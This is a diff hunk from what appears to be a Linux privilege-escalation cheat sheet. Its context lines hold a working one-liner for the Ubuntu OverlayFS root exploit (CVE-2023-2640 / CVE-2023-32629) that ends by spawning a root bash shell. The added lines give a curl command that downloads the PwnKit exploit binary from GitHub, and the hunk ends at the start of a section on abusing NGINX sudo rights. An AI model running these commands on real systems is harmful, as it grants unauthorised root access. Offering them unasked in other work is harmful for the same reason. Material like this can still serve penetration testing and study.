@@ -149,6 +149,10 @@ Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629):
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
 ```
 
+PwnKit (by the author of 'certipy'):
+```bash
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
+```
 Abuse NGINX sudo for privesc:
 ----
 create the following /tmp/pwn.conf on box:
